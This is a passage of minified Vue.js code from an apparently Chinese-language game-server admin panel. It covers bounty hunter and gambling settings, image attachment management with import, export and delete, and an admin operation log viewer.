orm.onlinePrize"}}),i("a-button",{staticStyle:{"margin-left":"5px"},attrs:{size:"small"},on:{click:function(t){e.settingsForm.onlinePrize=null}}},[e._v("置空")])],1),i("a-form-model-item",{attrs:{label:"最小登录奖励时间(分钟)",prop:"minRewardOnlineTime"}},[i("a-input-number",{attrs:{min:0},model:{value:e.settingsForm.minRewardOnlineTime,callback:function(t){e.$set(e.settingsForm,"minRewardOnlineTime",t)},expression:"settingsForm.minRewardOnlineTime"}}),i("a-button",{staticStyle:{"margin-left":"5px"},attrs:{size:"small"},on:{click:function(t){e.settingsForm.minRewardOnlineTime=null}}},[e._v("置空")])],1),i("a-form-model-item",{attrs:{label:"每日在线奖励上限",prop:"maxOnlineReward"}},[i("a-input-number",{attrs:{min:0},model:{value:e.settingsForm.maxOnlineReward,callback:function(t){e.$set(e.settingsForm,"maxOnlineReward",t)},expression:"settingsForm.maxOnlineReward"}}),i("a-button",{staticStyle:{"margin-left":"5px"},attrs:{size:"small"},on:{click:function(t){e.settingsForm.maxOnlineReward=null}}},[e._v("置空")])],1),i("a-form-model-item",{attrs:{label:"是否在播报的时候加上等级",prop:"enableLevelAnnounce"}},[i("a-switch",{model:{value:e.settingsForm.enableLevelAnnounce,callback:function(t){e.$set(e.settingsForm,"enableLevelAnnounce",t)},expression:"settingsForm.enableLevelAnnounce"}})],1)],1):e._e()],2)],1),i("Loading",{attrs:{tip:"正在加载",show:e.loading}})],1)])],1)}),[],!1,null,"4d7a80fc",null).exports),Ba={name:"TeleportSettings",components:{Loading:w},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{show:!1,loading:!1,edit:!1,saveLoading:!1,settingsForm:{EnableBountyHunter:!0,BountyHunterMinBounty:null,BountyHunterMinSecurityDeposit:null,EnableBountyHunterGambling:!0,BountyHunterMinTaxRate:null,BountyHunterMinBetAmount:null,BountyHunterMinBetTaxRate:null},settingsFormRules:{EnableBountyHunter:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],BountyHunterMinBounty:[{required:!0,trigger:"change",message:"请输入赏金猎人最小赏金",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入赏金猎人最小赏金"))}}],BountyHunterMinSecurityDeposit:[{required:!0,trigger:"change",message:"请输入赏金猎人最小保证金",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入赏金猎人最小保证金"))}}],BountyHunterMinTaxRate:[{required:!0,trigger:"change",message:"请输入赏金猎人赏金税率",validator:function(e,t,i){"number"==typeof t&&t>=0&&t<=100?i():i(new Error("请输入赏金猎人赏金税率"))}}],EnableBountyHunterGambling:[{required:!0,trigger:"change",message:"请选择",validator:function(e,t,i){"boolean"==typeof t?i():i(new Error("请选择"))}}],BountyHunterMinBetAmount:[{required:!0,trigger:"change",message:"请输入赏金猎人打赌最小金额",validator:function(e,t,i){"number"==typeof t&&t>=0?i():i(new Error("请输入赏金猎人打赌最小金额"))}}],BountyHunterMinBetTaxRate:[{required:!0,trigger:"change",message:"请输入赏金猎人打赌奖金税率",validator:function(e,t,i){"number"==typeof t&&t>=0&&t<=100?i():i(new Error("请输入赏金猎人打赌奖金税率"))}}]}}},mounted:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,e.getData();case 2:case"end":return t.stop()}}),t)})))()},methods:{getData:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return e.loading=!0,t.prev=1,t.next=4,f({method:"GET",url:"/serverConfigAdminSys/bountyHunterSettings"});case 4:i=t.sent,e.loading=!1,200===i.status&&e.$set(e,"settingsForm",i.data),t.next=13;break;case 9:t.prev=9,t.t0=t.catch(1),console.error(t.t0),e.loading=!1;case 13:case"end":return t.stop()}}),t,null,[[1,9]])})))()},onClickEdit:function(){this.show=!0,this.edit=!0},onClickCancelEdit:function(){this.edit=!1,this.getData()},onClickSave:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.settingsForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=20;break}return a=Object(A.cloneDeep)(e.settingsForm),console.log(a),e.saveLoading=!0,t.prev=4,t.next=7,f({method:"PUT",url:"/serverConfigAdminSys/updateBountyHunterSettings",data:a});case 7:if(n=t.sent,e.saveLoading=!1,200!==n.status){t.next=14;break}return e.$message.success("修改成功"),e.edit=!1,t.next=14,e.getData();case 14:t.next=20;break;case 16:t.prev=16,t.t0=t.catch(4),console.error(t.t0),e.saveLoading=!1;case 20:case"end":return t.stop()}}),t,null,[[4,16]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()},defaultBountyHunter:function(){this.$set(this,"settingsForm",{EnableBountyHunter:!1,BountyHunterMinBounty:1e3,BountyHunterMinSecurityDeposit:1e3,EnableBountyHunterGambling:!1,BountyHunterMinTaxRate:10,BountyHunterMinBetAmount:300,BountyHunterMinBetTaxRate:10})}}},Ha=(i("b5f7"),{name:"ServerConfigs",components:{LevelSettings:qa,NotificationSettings:za,SafezoneSettings:Na,VehiclesSettings:$a,GportalSettings:Ca,DollarsSettings:Ra,TeleportSettings:Pa,SpecialFunctionSettings:Object(S.a)(Ba,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"auto",position:"relative",background:"white"}},[i("div",{staticStyle:{width:"100%",height:"24px"}},[i("div",{staticStyle:{width:"5px",height:"24px",background:"#1890ff",display:"inline-block","vertical-align":"top"}}),i("div",{staticStyle:{width:"calc(100% - 80px)",height:"24px","margin-left":"5px","line-height":"24px","font-weight":"bolder",display:"inline-block","vertical-align":"top","overflow-x":"auto","white-space":"nowrap"}},[i("span",[e._v("特色功能设置")]),e.edit?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"sync"},on:{click:e.getData}},[e._v("刷新")]),e.loading?e._e():[e.edit||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"edit"},on:{click:e.onClickEdit}},[e._v("编辑")]),e.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{type:"primary",size:"small",icon:"edit",loading:e.saveLoading},on:{click:e.onClickSave}},[e._v("保存")]):e._e(),e.edit?i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"close",disabled:e.saveLoading},on:{click:e.onClickCancelEdit}},[e._v("取消")]):e._e()]],2),i("a-button",{staticStyle:{float:"right",width:"70px"},attrs:{icon:e.show?"minus":"plus",size:"small",type:"primary"},on:{click:function(t){e.show=!e.show}}},[e._v(e._s(e.show?"收起":"展开"))])],1),i("a-divider",{staticStyle:{margin:"5px 0"}}),i("transition",{attrs:{name:"fade"}},[i("div",{directives:[{name:"show",rawName:"v-show",value:e.show,expression:"show"}],staticStyle:{width:"100%","min-height":"300px",position:"relative",background:"white","overflow-y":"auto"}},[i("div",{staticStyle:{width:"100%",height:"100%",position:"absolute"}},[e.loading?e._e():i("a-form-model",{ref:"settingsForm",staticStyle:{"max-width":"950px"},attrs:{model:e.settingsForm,rules:e.settingsFormRules,"label-col":{span:7},"wrapper-col":{span:17}}},[i("a-form-model-item",{attrs:{label:"赏金猎人相关设置"}},[i("div",{staticStyle:{border:"1px #aaaaaa dashed","border-radius":"4px"},attrs:{id:"bounty-hunter-set"}},[i("a-form-model-item",{attrs:{label:"启用赏金猎人",prop:"EnableBountyHunter"}},[i("a-switch",{attrs:{disabled:!e.edit},on:{change:function(t){t||e.defaultBountyHunter()}},model:{value:e.settingsForm.EnableBountyHunter,callback:function(t){e.$set(e.settingsForm,"EnableBountyHunter",t)},expression:"settingsForm.EnableBountyHunter"}})],1),i("a-form-model-item",{attrs:{label:"赏金猎人最小赏金",prop:"BountyHunterMinBounty"}},[i("a-input-number",{attrs:{disabled:!e.edit||!e.settingsForm.EnableBountyHunter,min:0},model:{value:e.settingsForm.BountyHunterMinBounty,callback:function(t){e.$set(e.settingsForm,"BountyHunterMinBounty",t)},expression:"settingsForm.BountyHunterMinBounty"}})],1),i("a-form-model-item",{attrs:{label:"赏金猎人最小保证金",prop:"BountyHunterMinSecurityDeposit"}},[i("a-input-number",{attrs:{disabled:!e.edit||!e.settingsForm.EnableBountyHunter,min:0},model:{value:e.settingsForm.BountyHunterMinSecurityDeposit,callback:function(t){e.$set(e.settingsForm,"BountyHunterMinSecurityDeposit",t)},expression:"settingsForm.BountyHunterMinSecurityDeposit"}})],1),i("a-form-model-item",{attrs:{label:"赏金猎人赏金税率(%)",prop:"BountyHunterMinTaxRate"}},[i("a-input-number",{attrs:{disabled:!e.edit||!e.settingsForm.EnableBountyHunter,min:0,max:100},model:{value:e.settingsForm.BountyHunterMinTaxRate,callback:function(t){e.$set(e.settingsForm,"BountyHunterMinTaxRate",t)},expression:"settingsForm.BountyHunterMinTaxRate"}})],1),i("a-form-model-item",{attrs:{label:"启用打赌",prop:"EnableBountyHunterGambling"}},[i("a-switch",{attrs:{disabled:!e.edit},model:{value:e.settingsForm.EnableBountyHunterGambling,callback:function(t){e.$set(e.settingsForm,"EnableBountyHunterGambling",t)},expression:"settingsForm.EnableBountyHunterGambling"}})],1),i("a-form-model-item",{attrs:{label:"赏金猎人打赌最小金额",prop:"BountyHunterMinBetAmount"}},[i("a-input-number",{attrs:{disabled:!e.edit||!e.settingsForm.EnableBountyHunter,min:0},model:{value:e.settingsForm.BountyHunterMinBetAmount,callback:function(t){e.$set(e.settingsForm,"BountyHunterMinBetAmount",t)},expression:"settingsForm.BountyHunterMinBetAmount"}})],1),i("a-form-model-item",{attrs:{label:"赏金猎人打赌奖金税率(%)",prop:"BountyHunterMinBetTaxRate"}},[i("a-input-number",{attrs:{disabled:!e.edit||!e.settingsForm.EnableBountyHunter,min:0,max:100},model:{value:e.settingsForm.BountyHunterMinBetTaxRate,callback:function(t){e.$set(e.settingsForm,"BountyHunterMinBetTaxRate",t)},expression:"settingsForm.BountyHunterMinBetTaxRate"}})],1)],1)])],1)],1),i("Loading",{attrs:{tip:"正在加载",show:e.loading}})],1)])],1)}),[],!1,null,"9a327d28",null).exports},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{}},mounted:function(){},methods:{}}),ja=(i("494e"),Object(S.a)(Ha,(function(){var e=this.$createElement,t=this._self._c||e;return t("div",{staticStyle:{width:"100%",height:"100%"}},[t("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"商城配置"}}),t("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[t("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[t("GportalSettings"),t("DollarsSettings"),t("TeleportSettings"),t("VehiclesSettings"),t("SafezoneSettings"),t("NotificationSettings"),t("LevelSettings"),t("SpecialFunctionSettings")],1)])],1)}),[],!1,null,"2e422656",null).exports),Ya=i("53ca"),Ga={name:"Attachments",computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{cleanLoading:!1,moment:R.a,showEditAttachmentsItemModal:!1,editAttachmentsItemLoading:!1,editAttachmentsItemType:"add",editAttachmentsItemForm:{id:"",name:"",url:""},editAttachmentsItemRules:{name:[{required:!0,trigger:"change",message:"附件名称不能为空",validator:function(e,t,i){Object(Ya.a)(t)&&t.length?i():i(new Error("附件名称不能为空"))}}],url:[{required:!0,trigger:"change",message:"URL不能为空",validator:function(e,t,i){Object(Ya.a)(t)&&t.length?i():i(new Error("URL不能为空"))}}]},loadingAttachmentsListTable:!1,attachmentsListFilter:{name:void 0,url:void 0,timestampStart:void 0,timestampEnd:void 0},attachmentsListColumns:[{title:"预览",key:"preview",dataIndex:"preview",width:120,align:"center",scopedSlots:{customRender:"preview"}},{title:"附件名称",key:"name",dataIndex:"name",width:150,align:"center",scopedSlots:{customRender:"name"}},{title:"URL",key:"url",dataIndex:"url",width:300,align:"center",scopedSlots:{customRender:"url"}},{title:"创建时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}},{title:"操作",key:"controls",dataIndex:"controls",width:180,align:"center",scopedSlots:{customRender:"controls"}}],attachmentsListData:[],attachmentsListPagination:{pageSize:20,pageNum:1,total:0},exportLoading:!1,showImportAttachmentsItemModal:!1,importAttachmentsLoading:!1,importAttachmentsTxt:!1}},mounted:function(){this.getAttachmentsList()},methods:{onAttachmentsListCleanFilter:function(){var e=this;this.attachmentsListPagination.pageNum=1,this.$nextTick((function(){e.getAttachmentsList(!0)}))},onAttachmentsListFilter:function(){var e=this;this.attachmentsListPagination.pageNum=1,this.$nextTick((function(){e.getAttachmentsList()}))},onChangeAttachmentsListPagination:function(e){var t=this;this.attachmentsListPagination.pageNum=e,this.$nextTick((function(){t.getAttachmentsList()}))},onShowSizeChangeAttachmentsListPagination:function(e,t){var i=this;this.attachmentsListPagination.pageNum=1,this.attachmentsListPagination.pageSize=t,this.$nextTick((function(){i.getAttachmentsList()}))},getAttachmentsList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.attachmentsListPagination,n=a.pageNum,r=a.pageSize,e?(t.attachmentsListFilter={userName:void 0,status:void 0,secretKey:void 0,dollar:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r}):(void 0!==(l=Object(A.cloneDeep)(t.attachmentsListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingAttachmentsListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/attachmentsAdminSys/list",params:o});case 6:c=i.sent,t.loadingAttachmentsListTable=!1,200===c.status&&(t.attachmentsListPagination.total=c.data.count,t.attachmentsListData=c.data.list),i.next=15;break;case 11:i.prev=11,i.t0=i.catch(3),console.error(i.t0),t.loadingAttachmentsListTable=!1;case 15:case"end":return i.stop()}}),i,null,[[3,11]])})))()},cleanAttachments:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.cleanLoading=!0,t.next=4,f({method:"DELETE",url:"/attachmentsAdminSys/clean"});case 4:200===t.sent.status&&(e.cleanLoading=!1,e.$message.success("操作成功"),e.getAttachmentsList()),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.cleanLoading=!1,console.error(t.t0);case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()},submitEditAttachmentsItem:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.$refs.editAttachmentsItemForm.validate(function(){var t=Object(o.a)(regeneratorRuntime.mark((function t(i){var a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(!i){t.next=16;break}return a={name:e.editAttachmentsItemForm.name,url:e.editAttachmentsItemForm.url},"edit"===e.editAttachmentsItemType&&(a.id=e.editAttachmentsItemForm.id),e.editAttachmentsItemLoading=!0,t.prev=4,t.next=7,f({method:"edit"===e.editAttachmentsItemType?"PUT":"POST",url:"edit"===e.editAttachmentsItemType?"/attachmentsAdminSys/update":"/attachmentsAdminSys/add",data:a});case 7:n=t.sent,e.editAttachmentsItemLoading=!1,200===n.status?(e.showEditAttachmentsItemModal=!1,e.editAttachmentsItemLoading=!1,e.$message.success("edit"===e.editAttachmentsItemType?"修改成功":"添加成功"),e.editAttachmentsItemForm={name:"",url:""},e.getAttachmentsList()):(console.log("错误",n),e.$message.error(n.msg)),t.next=16;break;case 12:t.prev=12,t.t0=t.catch(4),console.error(t.t0),e.editAttachmentsItemLoading=!1;case 16:case"end":return t.stop()}}),t,null,[[4,12]])})));return function(e){return t.apply(this,arguments)}}());case 1:case"end":return t.stop()}}),t)})))()},clickAddAttachments:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:e.editAttachmentsItemType="add",e.editAttachmentsItemForm={id:"",name:"",url:""},e.showEditAttachmentsItemModal=!0;case 3:case"end":return t.stop()}}),t)})))()},clickEditAttachments:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:t.editAttachmentsItemType="edit",t.editAttachmentsItemForm={id:e.id,name:e.name,url:e.url},t.showEditAttachmentsItemModal=!0;case 3:case"end":return i.stop()}}),i)})))()},deleteAttachments:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return i.prev=0,i.next=3,f({method:"DELETE",url:"/attachmentsAdminSys/delete",params:{id:e}});case 3:200===(a=i.sent).status?(t.$message.success("已删除"),t.getAttachmentsList()):(console.log("错误",a),t.$message.error(a.msg)),i.next=10;break;case 7:i.prev=7,i.t0=i.catch(0),console.error(i.t0);case 10:case"end":return i.stop()}}),i,null,[[0,7]])})))()},clickExportAttachmentsList:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.prev=0,e.exportLoading=!0,t.next=4,f({method:"GET",url:"/attachmentsAdminSys/export"});case 4:200===(i=t.sent).status&&(a=JSON.stringify({data:i.data}),(n=document.createElement("a")).setAttribute("href","data:text/plain;charset=utf-8,"+encodeURIComponent(a)),n.setAttribute("download","attachments.log"),n.style.display="none",document.body.appendChild(n),n.click(),document.body.removeChild(n),e.exportLoading=!1,e.$message.success("导出成功")),t.next=12;break;case 8:t.prev=8,t.t0=t.catch(0),e.exportLoading=!1,e.$message.error("下载出错："+t.t0.toString());case 12:case"end":return t.stop()}}),t,null,[[0,8]])})))()},submitImportAttachments:function(){var e=this;return Object(o.a)(regeneratorRuntime.mark((function t(){var i,a,n,r,o;return regeneratorRuntime.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:if(e.importAttachmentsLoading=!0,t.prev=1,!(i=JSON.parse(e.importAttachmentsTxt)).data||void 0!==i.data.find((function(e){return!(e.name&&e.url)}))){t.next=18;break}return t.prev=4,t.next=7,f({method:"POST",url:"/attachmentsAdminSys/import",data:i});case 7:a=t.sent,e.importAttachmentsLoading=!1,200===a.status?(e.showImportAttachmentsItemModal=!1,e.importAttachmentsLoading=!1,n=a.data,r=n.success,o=n.fail,e.$message.success("已执行导入，成功".concat(r,"条，失败").concat(o,"条")),e.getAttachmentsList()):(console.log("错误",a),e.$message.error(a.msg)),t.next=16;break;case 12:t.prev=12,t.t0=t.catch(4),e.importAttachmentsLoading=!1,e.$message.error(t.t0);case 16:t.next=21;break;case 18:return e.importAttachmentsLoading=!1,e.$message.error("导入格式不正确"),t.abrupt("return");case 21:t.next=27;break;case 23:t.prev=23,t.t1=t.catch(1),e.importAttachmentsLoading=!1,e.$message.error("导入格式不正确");case 27:case"end":return t.stop()}}),t,null,[[1,23],[4,12]])})))()}}},Ka=Object(S.a)(Ga,(function(){var e=this,t=e.$createElement,i=e._self._c||t;return i("div",{staticStyle:{width:"100%",height:"100%"}},[i("a-page-header",{staticStyle:{border:"1px solid rgb(235, 237, 240)"},attrs:{title:"图片附件管理"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"extra"},slot:"extra"},[e.userInfo&&"sysAdmin"===e.userInfo.role?[i("a-button",{attrs:{size:"small",icon:"import"},on:{click:function(){e.importAttachmentsTxt="",e.showImportAttachmentsItemModal=!0}}},[e._v("导入附件")]),i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"export",loading:e.exportLoading},on:{click:e.clickExportAttachmentsList}},[e._v("导出所有附件")]),i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除所有附件吗"},on:{confirm:e.cleanAttachments}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",icon:"stop",type:"danger",loading:e.cleanLoading}},[e._v("删除所有附件")])],1)]:e._e(),i("a-modal",{attrs:{title:"导入附件","mask-closable":!1,width:600},on:{cancel:function(){e.showImportAttachmentsItemModal=!1,e.importAttachmentsTxt=""}},model:{value:e.showImportAttachmentsItemModal,callback:function(t){e.showImportAttachmentsItemModal=t},expression:"showImportAttachmentsItemModal"}},[i("template",{slot:"footer"},[i("a-button",{attrs:{type:"primary",loading:e.importAttachmentsLoading},on:{click:e.submitImportAttachments}},[e._v("开始导入")])],1),i("a-input",{staticStyle:{width:"100%","margin-top":"10px"},attrs:{type:"textarea","auto-size":{minRows:15,maxRows:15}},model:{value:e.importAttachmentsTxt,callback:function(t){e.importAttachmentsTxt=t},expression:"importAttachmentsTxt"}})],2),i("a-modal",{attrs:{title:("add"===e.editAttachmentsItemType?"添加":"编辑")+"附件","mask-closable":!1,width:600},on:{cancel:function(){e.editAttachmentsItemForm.dollar=null}},model:{value:e.showEditAttachmentsItemModal,callback:function(t){e.showEditAttachmentsItemModal=t},expression:"showEditAttachmentsItemModal"}},[i("template",{slot:"footer"},[i("a-button",{attrs:{type:"primary",loading:e.editAttachmentsItemLoading},on:{click:e.submitEditAttachmentsItem}},[e._v("提交")])],1),e.showEditAttachmentsItemModal?i("a-form-model",{ref:"editAttachmentsItemForm",staticStyle:{"max-width":"500px"},attrs:{model:e.editAttachmentsItemForm,rules:e.editAttachmentsItemRules,"label-col":{span:6},"wrapper-col":{span:18}}},[i("a-form-model-item",{attrs:{label:"附件名称",prop:"name"}},[i("a-input",{staticStyle:{width:"100%"},model:{value:e.editAttachmentsItemForm.name,callback:function(t){e.$set(e.editAttachmentsItemForm,"name",t)},expression:"editAttachmentsItemForm.name"}})],1),i("a-form-model-item",{attrs:{label:"URL",prop:"url"}},[i("a-input",{staticStyle:{width:"100%"},model:{value:e.editAttachmentsItemForm.url,callback:function(t){e.$set(e.editAttachmentsItemForm,"url",t)},expression:"editAttachmentsItemForm.url"}})],1)],1):e._e()],2)],2)]),i("div",{staticStyle:{width:"100%",height:"calc(100% - 66px)",padding:"15px","padding-top":"0"}},[i("div",{staticStyle:{width:"100%",height:"100%",background:"white","overflow-y":"auto",padding:"10px"}},[i("a-collapse",{staticStyle:{background:"none"},attrs:{"default-active-key":"1",bordered:!1}},[i("a-collapse-panel",{key:"1",staticStyle:{border:"none"}},[i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"},attrs:{slot:"header"},slot:"header"},[i("span",[e._v("搜索过滤条件")]),i("a-button",{staticStyle:{float:"right"},attrs:{size:"small",type:"primary",icon:"filter"},nativeOn:{click:function(t){return t.stopPropagation(),e.onAttachmentsListFilter.apply(null,arguments)}}},[e._v("过滤")]),i("a-button",{staticStyle:{float:"right","margin-right":"10px"},attrs:{size:"small"},nativeOn:{click:function(t){return t.stopPropagation(),e.onAttachmentsListCleanFilter.apply(null,arguments)}}},[e._v("清空过滤 / 刷新")])],1),i("div",{staticStyle:{"overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("附件名称:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"15px"},attrs:{placeholder:"模糊搜索",allowClear:""},model:{value:e.attachmentsListFilter.name,callback:function(t){e.$set(e.attachmentsListFilter,"name",t)},expression:"attachmentsListFilter.name"}}),i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block","margin-left":"15px"}},[e._v("URL:")]),i("a-input",{staticStyle:{width:"200px","margin-left":"15px"},attrs:{placeholder:"模糊搜索",allowClear:""},model:{value:e.attachmentsListFilter.url,callback:function(t){e.$set(e.attachmentsListFilter,"url",t)},expression:"attachmentsListFilter.url"}})],1),i("div",{staticStyle:{"margin-top":"10px","overflow-x":"auto","white-space":"nowrap"}},[i("div",{staticStyle:{width:"90px","text-align":"right",display:"inline-block"}},[e._v("创建时间:")]),i("a-range-picker",{staticStyle:{width:"320px","margin-left":"10px"},attrs:{"show-time":{format:"HH:mm:ss"},format:"YYYY-MM-DD HH:mm:ss",value:[e.attachmentsListFilter.timestampStart,e.attachmentsListFilter.timestampEnd],allowClear:""},on:{change:function(t){e.$set(e.attachmentsListFilter,"timestampStart",t[0]),e.$set(e.attachmentsListFilter,"timestampEnd",t[1])}}})],1)])],1),i("a-row",{staticStyle:{height:"32px","line-height":"32px"}},[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?e._e():i("a-button",{staticStyle:{float:"right",transform:"translateY(4px)"},attrs:{type:"primary",size:"small",icon:"plus"},on:{click:e.clickAddAttachments}},[e._v("添加")])],1),i("a-table",{staticStyle:{"margin-top":"10px"},attrs:{columns:e.attachmentsListColumns,"data-source":e.attachmentsListData,"row-key":"id",pagination:!1,loading:e.loadingAttachmentsListTable,bordered:"",scroll:{x:"100%"},size:"small"},scopedSlots:e._u([{key:"preview",fn:function(e,t){return[i("img",{staticStyle:{width:"100px","max-height":"120px"},attrs:{src:t.url}})]}},{key:"createdTimeStamp",fn:function(t){return[i("span",[e._v(e._s(t?e.moment(parseInt(t)).format("YYYY-MM-DD HH:mm:ss"):"-"))])]}},{key:"controls",fn:function(t,a){return[!e.userInfo||"sysAdmin"!==e.userInfo.role&&"admin"!==e.userInfo.role?i("span",[e._v("暂无可用操作")]):[i("a-button",{attrs:{size:"small",icon:"edit"},on:{click:function(){return e.clickEditAttachments(a)}}},[e._v("修改")]),i("a-popconfirm",{attrs:{placement:"right",title:"确定要删除附件吗"},on:{confirm:function(){return e.deleteAttachments(a.id)}}},[i("a-button",{staticStyle:{"margin-left":"10px"},attrs:{size:"small",type:"danger",icon:"delete"}},[e._v("删除")])],1)]]}}])}),i("a-pagination",{staticStyle:{"margin-top":"10px"},attrs:{"show-size-changer":"","page-size":e.attachmentsListPagination.pageSize,current:e.attachmentsListPagination.pageNum,total:e.attachmentsListPagination.total},on:{change:e.onChangeAttachmentsListPagination,showSizeChange:e.onShowSizeChangeAttachmentsListPagination}})],1)])],1)}),[],!1,null,"b80d38b0",null).exports,Va={name:"AdminRecord",components:{},computed:Object(s.a)({},Object(v.mapState)(["userInfo"])),data:function(){return{moment:R.a,cleanLoading:!1,loadingAdminRecordListTable:!1,adminRecordListFilter:{userId:void 0,module:void 0,description:void 0,timestampStart:void 0,timestampEnd:void 0},adminRecordListColumns:[{title:"操作人ID",key:"userId",dataIndex:"userId",width:150,align:"center",scopedSlots:{customRender:"userId"}},{title:"操作人游戏名称",key:"scumId",dataIndex:"scumId",width:180,align:"center",scopedSlots:{customRender:"scumId"}},{title:"记录模块",key:"module",dataIndex:"module",width:100,align:"center",scopedSlots:{customRender:"module"}},{title:"详情",key:"description",dataIndex:"description",width:180,align:"center",scopedSlots:{customRender:"description"}},{title:"生成记录时间",key:"createdTimeStamp",dataIndex:"createdTimeStamp",width:150,align:"center",scopedSlots:{customRender:"createdTimeStamp"}}],adminRecordListData:[],adminRecordListPagination:{pageSize:20,pageNum:1,total:0},expandedAdminRecordIds:[],moduleList:["行为日志","管理员","管理员指令日志","附件","登录登出","赏金猎人","购买管理","充值码管理","支付管理","聊天记录","NPC交易日志","商品管理","商品种类管理","会员等级管理","旧地雷日志","抽奖记录","消息队列管理","联办管理","配置管理","小队管理","用户管理","用户美金记录管理","违规日志","大清算","载具保险","玩家轨迹查询","公益彩票","载具销毁记录","箱子归属记录日志","其他未识别记录","比大小","物品回收类"]}},mounted:function(){this.getAdminRecordList()},methods:{onAdminRecordListCleanFilter:function(){var e=this;this.adminRecordListPagination.pageNum=1,this.$nextTick((function(){e.getAdminRecordList(!0)}))},onAdminRecordListFilter:function(){var e=this;this.adminRecordListPagination.pageNum=1,this.$nextTick((function(){e.getAdminRecordList()}))},onChangeAdminRecordListPagination:function(e){var t=this;this.adminRecordListPagination.pageNum=e,this.$nextTick((function(){t.getAdminRecordList()}))},onShowSizeChangeAdminRecordListPagination:function(e,t){var i=this;this.adminRecordListPagination.pageNum=1,this.adminRecordListPagination.pageSize=t,this.$nextTick((function(){i.getAdminRecordList()}))},getAdminRecordList:function(e){var t=this;return Object(o.a)(regeneratorRuntime.mark((function i(){var a,n,r,o,l,c;return regeneratorRuntime.wrap((function(i){for(;;)switch(i.prev=i.next){case 0:return a=t.adminRecordListPagination,n=a.pageNum,r=a.pageSize,e?(t.adminRecordListFilter={userId:void 0,module:void 0,description:void 0,timestampStart:void 0,timestampEnd:void 0},o={pageNum:n,pageSize:r}):(void 0!==(l=Object(A.cloneDeep)(t.adminRecordListFilter)).timestampStart&&void 0!==l.timestampEnd&&(l.timestampStart=R()(l.timestampStart).valueOf(),l.timestampEnd=R()(l.timestampEnd).valueOf()),o=Object(s.a)({pageNum:n,pageSize:r},l)),t.loadingAdminRecordListTable=!0,i.prev=3,i.next=6,f({method:"GET",url:"/adminRecordAdminSys/list",params:o});case 6:c=i.sent,t.loadingAdminRecordListTable=!1,200===c.status&&(t.adminRecordListPagination.total=c.data.count,t.adminRecordListData=c.data.list),i.next=15;break;case 